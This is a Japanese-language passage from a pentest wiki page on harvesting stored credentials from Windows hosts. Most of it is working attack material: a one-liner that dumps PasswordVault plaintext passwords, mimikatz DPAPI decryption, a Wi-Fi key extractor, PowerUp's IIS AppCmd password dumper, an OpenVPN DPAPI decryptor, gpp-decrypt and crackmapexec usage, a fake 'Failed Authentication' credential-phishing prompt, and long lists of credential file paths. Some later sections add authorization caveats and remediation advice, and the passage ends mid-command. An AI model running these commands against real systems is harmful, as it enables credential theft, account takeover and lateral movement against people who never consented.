最新のWindows UWPアプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンやplaintext passwordを、Universal Windows Platform（UWP）の`PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）に保存します。この保存領域はセッションごとに分離されており、管理者権限や`SeDebugPrivilege`がなくても、ネイティブに復号できます。

ユーザーのアクティブなセッション内で次のPowerShellコマンドを実行すると、保存されているすべてのユーザー名とplaintext passwordを即座にdumpして復号できます:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** はデータを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムの秘密情報を利用して、エントロピーを大幅に高めます。

**DPAPI では、ユーザーのログイン秘密情報から導出した対称鍵を使って鍵を暗号化できます**。システム暗号化の場合は、システムのドメイン認証秘密情報を使用します。

DPAPI を使って暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**同じファイル内でユーザーの秘密鍵を保護するマスターキーとともに保存される DPAPI キー**は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

`/pvk` または `/rpc` の適切な引数を指定して、**mimikatz module** `dpapi::masterkey` を使うと復号できます。

**マスターパスワードで保護された認証情報ファイル**は、通常次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使って復号できます。\
`sekurlsa::dpapi` module を使うと、**memory** から多数の **DPAPI** **masterkeys** を **extract** できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 資格情報

**PowerShell 資格情報**は、暗号化された資格情報を便利に保存する方法として、**scripting** や自動化タスクでよく使われます。資格情報は **DPAPI** で保護されているため、通常は作成時と同じコンピューター上で同じユーザーだけが復号できます。

エクスポートされた資格情報のファイル名や `.xml` のパスは任意です。スクリプトやファイルの一覧からそのファイルを見つけた場合は、`C:\Users` にあると決めつけず、対象アカウントの実際のプロファイルディレクトリを特定してください：[Windows ではプロファイルが別の場所に配置されることがあります](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手がかりにすぎません。[Windows の `Export-Clixml` は、暗号化された資格情報をエクスポート元のユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントが対象サービスで有効な権限を持つことも別途確認する必要があります。通常の列挙では、暗号化された値や平文の値を表示せず、まずパスと ACL を確認してください。

ファイル内の PS 資格情報を **decrypt** するには、次のようにします:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済み RDP 接続

次の場所で確認できます: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Mimikatz の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**.rdg ファイルを復号**します。\
Mimikatz の `sekurlsa::dpapi` module を使用すると、メモリから多数の DPAPI masterkey を**抽出**できます。

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents 内にある読み取り可能な XML を調査します。`config.xml` のような一般的な名前のファイルも対象に含めます。XML ファイルを認証情報の手がかりとして扱う前に、接続スキーマと、暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定と、カスタム master password が使用されたかどうかによります。広範な列挙中に暗号化された値を表示しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有管理フォルダー内で読み取り可能な場合があります。従来の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。空でない password 要素は認証情報の手がかりとして扱い、値を表示したり、平文だと決めつけたりしないでください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイル保護は作成時のアカウントとコンピューターに紐付けることも、より緩い設定にすることもできます。これを当てにする前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

ユーザーが付箋アプリにパスワードなどの情報を保存することがあります。Microsoft のパッケージ版 Sticky Notes アプリは通常、ノートを `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存します。古いアプリや別のアプリでは、LevelDB を含む別のユーザープロファイル内ストアが使われることがあります。SQLite ファイルが見つからないことをノートが存在しない証拠とみなす前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたノートが含まれないことがあります。データベースの整合性が保たれたコピーとともに、対応する `plum.sqlite-wal` を保管してください。利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むノートは、あくまで認証情報の手がかりにすぎません。アカウント、許可されたアクセス権、パスワードの使い回しはそれぞれ別に確認してください。暗号化された password manager のレコードを、より高い権限のログインに利用できると確認するには、実際の復号キーとアプリ固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator 権限が必要であり、High Integrity level で実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの**認証情報**が設定されており、**復元**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`が存在するか確認します .\
インストーラーは**SYSTEM権限で実行されます**。多くの場合、**DLL Sideloadingに対して脆弱です（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

一部の古いリモートサポート製品では、固定のアプリケーションレジストリキーの下に、パスワード関連の値名が残っています。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer の `SecurityPasswordAES` はバージョン 9 より前では設定済みの静的なセッションパスワードを示していました。値名のマーカーは調査の手がかりにすぎません。評価する前に、インストール済みのバージョン、読み取り可能な値データの内容と形式、および現在の認証動作を確認してください。リモートサポートのパスワードをより高い権限を持つ Windows アカウントに結び付けるには、実際にパスワードが再利用されており、そのアカウントへのアクセスが許可されている必要があります。暗号文や復元したパスワードを通常の列挙出力に含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウントデータが含まれている疑いがある場合、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoft によると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけではブックの内容が暗号化されているとは言えません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を出力しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、あるいは非表示列だけでは、認証情報の存在や、いずれかのアカウントがより高い権限を持つことの証明にはなりません。実際のデータと現在のアカウント権限を個別に確認してください。

### CI サーバーに残された変更パッチ

CI サーバーは、ビルドの終了後も、送信されたソース変更をデータディレクトリに保持していることがあります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` はリモート実行の変更を保存する場所とされています。データディレクトリは設定可能で、必ずしも `ProgramData` の下にあるとは限りません。読み取り可能なパッチには、認証情報ファイル、暗号化キー、または両方を使用するスクリプトへの参照が追加または削除された形で残っていることがあります。たとえば、PowerShell の `ConvertTo-SecureString -Key` ワークフローには、暗号化文字列に加えて AES キーも必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)によると、キーは別途指定します。まずアクセス可能なパッチ名だけを確認し、その後、許可を得たうえで関連する内容を調べてください。通常の列挙出力に秘密情報を含めないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や、より高い権限へのアクセスの証明にはなりません。データディレクトリの ACL を制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自に作成されたパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存する一方、データストアの認証情報を読み取り可能な `.env` ファイルやアップデーターのバイナリの隣に保持していることがあります。アップデーターのスケジュールされたタスク、アカウント、構成の ACL、リスナー、データストアの権限を併せて確認してください。ループバック専用のデータストアでも、有効な認証情報を持つローカルユーザーからは到達可能です。ただし、認証できるだけでは、該当レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文の隣から取得できる場合は、その暗号化を信用する前に、実際のキー導出方法を確認してください。公開されたシードから Go の [`math/rand`](https://pkg.go.dev/math/rand) を使って AES キーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Go のドキュメントでも、このパッケージはセキュリティ上重要なランダム性の用途には適さないとされています。復元したパスワードを権限昇格経路とみなす前に、そのパスワードが現在も有効であり、ローカル Administrators グループのアカウントに属していることを確認してください。スケジュールされたタスク、`.env` のパス、暗号化されたデータだけでは、これらの条件を証明できません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理されたローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) を使用してください。ディレクトリまたは Entra に基づくその保存先とアクセス制御は、カスタムのローカルデータストアとは異なります。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Java サーバープラグインのアーカイブと認証情報の再利用

一部の Java サーバープラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布されています。読み取り可能なカスタムプラグインには、サービス認証情報を埋め込んだ構成やバイトコードが含まれていることがあります。許可を得た場合に限りアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在を証明できません。また、サービスパスワードを復元できても、より高い権限を持つアカウントでも有効な場合に限り、権限昇格につながります。関連ファイルの ACL を確認し、再利用された認証情報は個別の秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の組み込みデータベース認証情報

組み込みデータベースを使用する Openfire のインストール環境では、`openfire.script` が `Openfire\embedded-db` の下に置かれていることがあります。現在のアカウントがこのファイルを読み取れる場合は、`OFUSER` レコードと `passwordKey` プロパティを併せて確認してください。Openfire の[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードはプレーンテキストで保存するか、そのプロパティに保持されたキーで暗号化できます。復元したパスワードが権限昇格に関係するのは、より高い権限を持つ ID でも現在有効な場合に限られます。ファイル名だけでは、読み取りアクセスや認証情報の再利用のいずれも証明できません。このパスはインベントリ調査の手がかりとして扱い、データベースの内容や認証情報を通常の列挙出力に含めないでください。

別のファイルである `Openfire\conf\openfire.xml` には、外部データベースを使用している場合でも、管理コンソールに設定されたポートとバインドインターフェイスが記載されていることがあります。Openfire の管理コンソールは通常ループバックにバインドされますが、リスナーが稼働中であれば、ローカルアカウントからそのアドレスに接続できます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、および Openfire サービスの ID を併せて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスが LocalSystem として実行されている場合、これは高い権限につながる可能性があります。一致するアカウントパスワードや読み取り可能な構成パスだけでは、管理コンソールへのアクセスやコード実行を証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロード API のプロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの構成

Velociraptor サーバーの構成ファイルは一般に `server.config.yaml` という名前で、内部 CA の `CA.private_key` を含むことがあります。権限の低いユーザーがこのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。これが権限昇格につながるかどうかは、サーバーのユーザーロール、API への到達性、サーバーまたは対象エージェントの実行 ID によって異なります。クライアント構成には別の情報が含まれます。クライアント構成が見つかっても、サーバー CA にアクセスできるとは限りません。CA の秘密鍵をオフラインで保管している環境もあるため、読み取り可能なサーバー構成に署名キーが含まれていないこともあります。

Windows サーバーでは、インストールディレクトリにある**サーバー**構成と、保護されたバックアップコピーの ACL を確認してください。場所の例は `%ProgramFiles%\VelociraptorServer\server.config.yaml` です。異なる場合は、サービスに設定されたパスを使用してください。現在の ID にファイルの読み取り権限があることと、`CA.private_key` が実際に存在することを確認してください。ログや列挙出力に秘密鍵を出力しないでください。ベンダーの `config api_client` ワークフローでは CA キーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。そのロールの作成または変更には、データストアへの書き込み権限や再起動が必要な場合があります。こうした書き込みができない場合でも、既存の権限を持つサーバー ID が経路となることがあります。実行権限を持つ API クエリは、該当するサーバーまたはエージェントのコンテキストで実行されるため、高い権限を持つ可能性があります。

サーバー構成とバックアップの ACL を制限し、可能であれば CA 署名キーをオフラインで保管し、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)および[セキュリティ構成ガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty 認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があります。一方、エクスポートされたセッションのバックアップは`sessions-backup.dat`という名前で、別の場所に保存されている場合があります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連付けを含むことがあります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)には、ネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルを見つけても、そのパスワードが判明するわけではなく、保存された認証情報が今も有効であることや、より高い権限を持つことの証明にもなりません。

### PuTTY SSHホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内のSSH keys

SSH private keysはレジストリキー`HKCU\Software\OpenSSH\Agent\Keys`内に保存されていることがあるため、興味深い情報がないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリがあれば、保存された SSH key である可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動起動させたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。SSH keyをいくつか作成し、`ssh-add`で追加してから、SSHでマシンにログインしようとしました。レジストリのHKCU\Software\OpenSSH\Agent\Keysは存在せず、procmonでも非対称鍵認証中に`dpapi.dll`が使用されたことを確認できませんでした。

### 無人応答ファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

**metasploit**を使ってこれらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

内容の例:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM と SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。まず、ローカルからアクセス可能なバックアップディレクトリやイメージディレクトリを優先し、何かを抽出する前にイメージ内の**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出しているとは限らず、一般的な `install.wim`、`boot.wim`、およびリカバリーイメージは誤検出につながりやすいものです。SMB share は別のアクセス経路であり、その share が調査対象に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) および [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** というファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存された Group Policy Objects (GPO) に、ドメイン内のすべてのユーザーがアクセスできました。次に、公開されている既定の鍵を使い AES256 で暗号化された GPP 内のパスワードは、認証済みのユーザーであれば誰でも復号できました。これにより、ユーザーが昇格した権限を取得できる深刻なリスクが生じていました。

このリスクを軽減するため、空でない「cpassword」フィールドを含む、ローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。そのようなファイルが見つかると、この関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、脆弱性の特定と修正に役立つよう、GPP の詳細とファイルの場所が含まれます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 以前)_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec を使用してパスワードを取得する:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

配信対象の webroot に直接置かれた古い ZIP バックアップから、過去の設定ファイルや再利用可能な認証情報が漏えいする可能性があります。露出していると判断する前に、サイトに設定された物理パスと、そのアーカイブに HTTP 経由で実際にアクセスできるかを確認してください。既定の `C:\inetpub\wwwroot` は候補にすぎません。手早くローカルの一覧を確認するには、アーカイブを開かずに名前とサイズを表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、復元した認証情報でより高い権限を得られることも証明できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう常に尋ねることができます**（ただし、クライアントに直接**認証情報**を尋ねるのは非常に**危険**です）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことが知られているファイル

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3のデータベースでは、一般に`.psafe3`拡張子が使われます。一致するファイル名は暗号化されたvaultの候補として扱ってください。ファイルが存在しても、内容を読み取れる、ロックを解除できる、または保存された認証情報を使えることを意味するわけではありません。これらのファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能なKeePassの`.kdbx`も、暗号化されたvaultの手掛かりにすぎません。ロックを解除するには、実際のmaster passwordに加え、設定されているkey fileやアカウント要素が必要です。認可された調査でエントリ内にLM:NT hashペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash)を検討する前に、記載されたアカウントと、NT hashが有効で、対象のNTLMサービスが受け付けるものかを確認してください。vaultのエントリだけでAdministratorまたはSYSTEM権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、および別途必要なサービス実行手順も満たす必要があります。インベントリにはvaultのパスと読み取り可否を記録し、データベースや保存された認証情報を出力しないでください。

候補となるファイルをすべて検索してください:

```
cd C:\
